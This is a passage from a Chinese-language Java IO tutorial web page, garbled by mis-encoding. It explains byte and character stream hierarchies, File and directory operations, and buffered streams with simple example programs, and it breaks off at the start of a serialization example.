  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:23:53.000Z" title="Tue Dec 09 2025 09:23:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Java IOä½“ç³»æ¦‚è¿°</h2>
<p>Java IOï¼ˆè¾“å…¥/è¾“å‡ºï¼‰æ˜¯Javaå¤„ç†æ•°æ®è¾“å…¥è¾“å‡ºçš„æ ¸å¿ƒAPIï¼Œå®ƒæä¾›äº†ä¸€å¥—å®Œæ•´çš„æœºåˆ¶æ¥å¤„ç†ä¸åŒç±»å‹çš„æ•°æ®æºå’Œæ•°æ®æµå‘ã€‚Java IOæ“ä½œä¸»è¦åŸºäº<strong>æµï¼ˆStreamï¼‰</strong> â€‹ çš„æ¦‚å¿µï¼Œæµå¯ä»¥çœ‹ä½œæ˜¯æ•°æ®æµåŠ¨çš„é€šé“ï¼Œæ•°æ®ä»æºå¤´ï¼ˆå¦‚æ–‡ä»¶ã€ç½‘ç»œã€å†…å­˜ç­‰ï¼‰æµå‘ç›®çš„åœ°ã€‚ æ ¹æ®æ•°æ®å¤„ç†æ–¹å¼çš„ä¸åŒï¼ŒJava IOæµä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p>
<ul>
<li><strong>å­—èŠ‚æµ</strong>ï¼šä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œæ•°æ®è¯»å†™ï¼Œå¯ä»¥å¤„ç†æ‰€æœ‰ç±»å‹çš„æ•°æ®</li>
<li><strong>å­—ç¬¦æµ</strong>ï¼šä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œæ•°æ®è¯»å†™ï¼Œä¸“é—¨å¤„ç†æ–‡æœ¬æ•°æ®</li>
</ul>
<h2 data-id="heading-1">äºŒã€IOæµæ ¸å¿ƒåˆ†ç±»ä¸ä½“ç³»ç»“æ„</h2>
<h3 data-id="heading-2">2.1 å­—èŠ‚æµä½“ç³»</h3>
<p>å­—èŠ‚æµæ˜¯Java IOä¸­æœ€åŸºç¡€çš„æµç±»å‹ï¼Œä¸»è¦ç”¨äºå¤„ç†äºŒè¿›åˆ¶æ•°æ®ã€‚ <strong>è¾“å…¥æµï¼ˆInputStreamï¼‰ç»§æ‰¿ä½“ç³»</strong>ï¼š</p>
<pre><code class="hljs">InputStreamï¼ˆæŠ½è±¡ç±»ï¼‰
â”œâ”€â”€ FileInputStreamï¼ˆæ–‡ä»¶è¾“å…¥æµï¼‰
â”œâ”€â”€ ByteArrayInputStreamï¼ˆå­—èŠ‚æ•°ç»„è¾“å…¥æµï¼‰
â”œâ”€â”€ FilterInputStreamï¼ˆè¿‡æ»¤è¾“å…¥æµï¼‰
â”‚   â”œâ”€â”€ BufferedInputStreamï¼ˆç¼“å†²è¾“å…¥æµï¼‰
â”‚   â”œâ”€â”€ DataInputStreamï¼ˆæ•°æ®è¾“å…¥æµï¼‰
â”‚   â””â”€â”€ ObjectInputStreamï¼ˆå¯¹è±¡è¾“å…¥æµï¼‰
â””â”€â”€ PipedInputStreamï¼ˆç®¡é“è¾“å…¥æµï¼‰
</code></pre>
<p><strong>è¾“å‡ºæµï¼ˆOutputStreamï¼‰ç»§æ‰¿ä½“ç³»</strong>ï¼š</p>
<pre><code class="hljs">OutputStreamï¼ˆæŠ½è±¡ç±»ï¼‰
â”œâ”€â”€ FileOutputStreamï¼ˆæ–‡ä»¶è¾“å‡ºæµï¼‰
â”œâ”€â”€ ByteArrayOutputStreamï¼ˆå­—èŠ‚æ•°ç»„è¾“å‡ºæµï¼‰
â”œâ”€â”€ FilterOutputStreamï¼ˆè¿‡æ»¤è¾“å‡ºæµï¼‰
â”‚   â”œâ”€â”€ BufferedOutputStreamï¼ˆç¼“å†²è¾“å‡ºæµï¼‰
â”‚   â”œâ”€â”€ DataOutputStreamï¼ˆæ•°æ®è¾“å‡ºæµï¼‰
â”‚   â””â”€â”€ ObjectOutputStreamï¼ˆå¯¹è±¡è¾“å‡ºæµï¼‰
â””â”€â”€ PipedOutputStreamï¼ˆç®¡é“è¾“å‡ºæµï¼‰
</code></pre>
<h3 data-id="heading-3">2.2 å­—ç¬¦æµä½“ç³»</h3>
<p>å­—ç¬¦æµä¸“é—¨ç”¨äºå¤„ç†æ–‡æœ¬æ•°æ®ï¼Œæ”¯æŒå­—ç¬¦ç¼–ç è½¬æ¢ã€‚</p>
<p><strong>è¯»å–æµï¼ˆReaderï¼‰ç»§æ‰¿ä½“ç³»</strong>ï¼š</p>
<pre><code class="hljs">Readerï¼ˆæŠ½è±¡ç±»ï¼‰
â”œâ”€â”€ InputStreamReaderï¼ˆå­—èŠ‚å­—ç¬¦è½¬æ¢æµï¼‰
â”‚   â””â”€â”€ FileReaderï¼ˆæ–‡ä»¶è¯»å–æµï¼‰
â”œâ”€â”€ BufferedReaderï¼ˆç¼“å†²è¯»å–æµï¼‰
â”œâ”€â”€ CharArrayReaderï¼ˆå­—ç¬¦æ•°ç»„è¯»å–æµï¼‰
â””â”€â”€ StringReaderï¼ˆå­—ç¬¦ä¸²è¯»å–æµï¼‰
</code></pre>
<p><strong>å†™å…¥æµï¼ˆWriterï¼‰ç»§æ‰¿ä½“ç³»</strong>ï¼š</p>
<pre><code class="hljs">Writerï¼ˆæŠ½è±¡ç±»ï¼‰
â”œâ”€â”€ OutputStreamWriterï¼ˆå­—ç¬¦å­—èŠ‚è½¬æ¢æµï¼‰
â”‚   â””â”€â”€ FileWriterï¼ˆæ–‡ä»¶å†™å…¥æµï¼‰
â”œâ”€â”€ BufferedWriterï¼ˆç¼“å†²å†™å…¥æµï¼‰
â”œâ”€â”€ CharArrayWriterï¼ˆå­—ç¬¦æ•°ç»„å†™å…¥æµï¼‰
â”œâ”€â”€ StringWriterï¼ˆå­—ç¬¦ä¸²å†™å…¥æµï¼‰
â””â”€â”€ PrintWriterï¼ˆæ‰“å°å†™å…¥æµï¼‰
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€æ–‡ä»¶æ“ä½œä¸Fileç±»</h2>
<p>Fileç±»æ˜¯Java IOä¸­ç”¨äºè¡¨ç¤ºæ–‡ä»¶å’Œç›®å½•è·¯å¾„çš„æŠ½è±¡ï¼Œå®ƒæä¾›äº†ä¸°å¯Œçš„æ–‡ä»¶æ“ä½œæ–¹æ³•ã€‚</p>
<h3 data-id="heading-5">3.1 Fileç±»åŸºæœ¬æ“ä½œ</h3>
<pre><code class="hljs language-csharp" lang="csharp">import java.io.File;
import java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FileOperationExample</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        <span class="hljs-comment">// åˆ›å»ºFileå¯¹è±¡</span>
        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">"example.txt"</span>);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åˆ›å»ºæ–°æ–‡ä»¶</span>
            <span class="hljs-keyword">if</span> (file.createNewFile()) {
                System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ–‡ä»¶åˆ›å»ºæˆåŠŸ: "</span> + file.getName());
            } <span class="hljs-keyword">else</span> {
                System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ–‡ä»¶å·²å­˜åœ¨"</span>);
            }
            
            <span class="hljs-comment">// æ–‡ä»¶ä¿¡æ¯è·å–</span>
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ–‡ä»¶è·¯å¾„: "</span> + file.getPath());
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"ç»å¯¹è·¯å¾„: "</span> + file.getAbsolutePath());
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ–‡ä»¶å¤§å°: "</span> + file.length() + <span class="hljs-string">" å­—èŠ‚"</span>);
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"å¯è¯»: "</span> + file.canRead());
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"å¯å†™: "</span> + file.canWrite());
            
            <span class="hljs-comment">// åˆ é™¤æ–‡ä»¶</span>
            <span class="hljs-keyword">if</span> (file.delete()) {
                System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ–‡ä»¶åˆ é™¤æˆåŠŸ"</span>);
            }
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<h3 data-id="heading-6">3.2 ç›®å½•æ“ä½œ</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> java.io.<span class="hljs-built_in">File</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectoryExample</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-comment">// åˆ›å»ºç›®å½•</span>
        <span class="hljs-built_in">File</span> dir = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(<span class="hljs-string">"myDirectory"</span>);
        <span class="hljs-keyword">if</span> (!dir.<span class="hljs-built_in">exists</span>()) {
            <span class="hljs-keyword">if</span> (dir.<span class="hljs-built_in">mkdir</span>()) {
                System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"ç›®å½•åˆ›å»ºæˆåŠŸ"</span>);
            }
        }
        
        <span class="hljs-comment">// åˆ—å‡ºç›®å½•å†…å®¹</span>
        <span class="hljs-keyword">if</span> (dir.<span class="hljs-built_in">isDirectory</span>()) {
            <span class="hljs-type">String</span>[] files = dir.<span class="hljs-built_in">list</span>();
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"ç›®å½•å†…å®¹:"</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> file : files) {
                System.out.<span class="hljs-built_in">println</span>(file);
            }
        }
        
        <span class="hljs-comment">// åˆ›å»ºå¤šçº§ç›®å½•</span>
        <span class="hljs-built_in">File</span> multiDir = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(<span class="hljs-string">"parent/child/grandchild"</span>);
        <span class="hljs-keyword">if</span> (multiDir.<span class="hljs-built_in">mkdirs</span>()) {
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"å¤šçº§ç›®å½•åˆ›å»ºæˆåŠŸ"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-7">å››ã€å­—èŠ‚æµè¯¦ç»†æ“ä½œ</h2>
<h3 data-id="heading-8">4.1 æ–‡ä»¶å­—èŠ‚æµæ“ä½œ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ByteStreamExample</span> {
    
    <span class="hljs-comment">// æ–‡ä»¶å†™å…¥ç¤ºä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">(String filename, String content)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filename)) {
            <span class="hljs-type">byte</span>[] contentBytes = content.getBytes();
            fos.write(contentBytes);
            System.out.println(<span class="hljs-string">"æ–‡ä»¶å†™å…¥æˆåŠŸ"</span>);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-comment">// æ–‡ä»¶è¯»å–ç¤ºä¾‹ - å•å­—èŠ‚è¯»å–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileSingleByte</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)) {
            <span class="hljs-type">int</span> content;
            System.out.println(<span class="hljs-string">"å•å­—èŠ‚è¯»å–å†…å®¹:"</span>);
            <span class="hljs-keyword">while</span> ((content = fis.read()) != -<span class="hljs-number">1</span>) {
                System.out.print((<span class="hljs-type">char</span>) content);
            }
            System.out.println();
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-comment">// æ–‡ä»¶è¯»å–ç¤ºä¾‹ - å­—èŠ‚æ•°ç»„è¯»å–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByteArray</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)) {
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];
            <span class="hljs-type">int</span> bytesRead;
            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
            
            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) {
                content.append(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buffer, <span class="hljs-number">0</span>, bytesRead));
            }
            System.out.println(<span class="hljs-string">"å­—èŠ‚æ•°ç»„è¯»å–å†…å®¹: "</span> + content.toString());
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">"test.txt"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, Java IO World!\nè¿™æ˜¯æµ‹è¯•å†…å®¹ã€‚"</span>;
        
        writeFile(filename, content);
        readFileSingleByte(filename);
        readFileByteArray(filename);
    }
}
</code></pre>
<h3 data-id="heading-9">4.2 ç¼“å†²å­—èŠ‚æµæ“ä½œ</h3>
<p>ç¼“å†²æµé€šè¿‡å†…ç½®ç¼“å†²åŒºæ˜¾è‘—æé«˜IOæ•ˆç‡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BufferedStreamExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFileWithBuffer</span><span class="hljs-params">(String source, String destination)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(source);
             <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);
             <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(destination);
             <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos)) {
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];
            <span class="hljs-type">int</span> bytesRead;
            
            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) {
                bos.write(buffer, <span class="hljs-number">0</span>, bytesRead);
            }
            bos.flush(); <span class="hljs-comment">// ç¡®ä¿æ‰€æœ‰æ•°æ®å†™å…¥</span>
            System.out.println(<span class="hljs-string">"æ–‡ä»¶å¤åˆ¶å®Œæˆ"</span>);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        copyFileWithBuffer(<span class="hljs-string">"source.txt"</span>, <span class="hljs-string">"destination.txt"</span>);
    }
}
</code></pre>
<h2 data-id="heading-10">äº”ã€å­—ç¬¦æµè¯¦ç»†æ“ä½œ</h2>
<h3 data-id="heading-11">5.1 æ–‡ä»¶å­—ç¬¦æµæ“ä½œ</h3>
<p>å­—ç¬¦æµä¸“é—¨ç”¨äºæ–‡æœ¬æ–‡ä»¶å¤„ç†ï¼Œæ”¯æŒå­—ç¬¦ç¼–ç ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CharacterStreamExample</span> {
    
    <span class="hljs-comment">// ä½¿ç”¨FileReaderå’ŒFileWriter</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyTextFile</span><span class="hljs-params">(String source, String destination)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(source);
             <span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(destination)) {
            
            <span class="hljs-type">int</span> character;
            <span class="hljs-keyword">while</span> ((character = reader.read()) != -<span class="hljs-number">1</span>) {
                writer.write(character);
            }
            System.out.println(<span class="hljs-string">"æ–‡æœ¬æ–‡ä»¶å¤åˆ¶å®Œæˆ"</span>);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨æŒ‡å®šå­—ç¬¦ç¼–ç </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithEncoding</span><span class="hljs-params">(String filename, String charset)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename), charset)) {
            
            <span class="hljs-type">int</span> character;
            <span class="hljs-keyword">while</span> ((character = isr.read()) != -<span class="hljs-number">1</span>) {
                System.out.print((<span class="hljs-type">char</span>) character);
            }
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        copyTextFile(<span class="hljs-string">"input.txt"</span>, <span class="hljs-string">"output.txt"</span>);
        readWithEncoding(<span class="hljs-string">"input.txt"</span>, <span class="hljs-string">"UTF-8"</span>);
    }
}
</code></pre>
<h3 data-id="heading-12">5.2 ç¼“å†²å­—ç¬¦æµæ“ä½œ</h3>
<p>ç¼“å†²å­—ç¬¦æµæä¾›äº†è¡Œè¯»å–ç­‰ä¾¿åˆ©æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BufferedCharacterExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">readFileLineByLine</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> filename</span>) {
        <span class="hljs-keyword">try</span> (<span class="hljs-title class_">FileReader</span> fr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filename);
             <span class="hljs-title class_">BufferedReader</span> br = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(fr)) {
            
            <span class="hljs-title class_">String</span> line;
            int lineNumber = <span class="hljs-number">1</span>;
            
            <span class="hljs-keyword">while</span> ((line = br.<span class="hljs-title function_">readLine</span>()) != <span class="hljs-literal">null</span>) {
                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"è¡Œ "</span> + lineNumber + <span class="hljs-string">": "</span> + line);
                lineNumber++;
            }
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) {
            e.<span class="hljs-title function_">printStackTrace</span>();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">writeToFileWithBuffer</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> filename, <span class="hljs-built_in">String</span>[] lines</span>) {
        <span class="hljs-keyword">try</span> (<span class="hljs-title class_">FileWriter</span> fw = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(filename);
             <span class="hljs-title class_">BufferedWriter</span> bw = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(fw)) {
            
            <span class="hljs-keyword">for</span> (<span class="hljs-title class_">String</span> line : lines) {
                bw.<span class="hljs-title function_">write</span>(line);
                bw.<span class="hljs-title function_">newLine</span>(); <span class="hljs-comment">// å†™å…¥æ¢è¡Œç¬¦</span>
            }
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ–‡ä»¶å†™å…¥å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) {
            e.<span class="hljs-title function_">printStackTrace</span>();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">String</span>[] content = {
            <span class="hljs-string">"ç¬¬ä¸€è¡Œå†…å®¹"</span>,
            <span class="hljs-string">"ç¬¬äºŒè¡Œå†…å®¹"</span>, 
            <span class="hljs-string">"ç¬¬ä¸‰è¡Œå†…å®¹"</span>
        };
        
        <span class="hljs-title function_">writeToFileWithBuffer</span>(<span class="hljs-string">"buffered.txt"</span>, content);
        <span class="hljs-title function_">readFileLineByLine</span>(<span class="hljs-string">"buffered.txt"</span>);
    }
}
</code></pre>
<h2 data-id="heading-13">å…­ã€é«˜çº§IOæ“ä½œ</h2>
<h3 data-id="heading-14">6.1 å¯¹è±¡åºåˆ—åŒ–</h3>
<p>åºåˆ—åŒ–å…è®¸å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµè¿›è¡Œå­˜å‚¨æˆ–ä¼ è¾“ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String password; <span class="hljs-comment">// transientå­—æ®µä¸åºåˆ—åŒ–</span>
    <span class="hljs-keyword">private</span> Date createTime;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, String password)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.password = password;
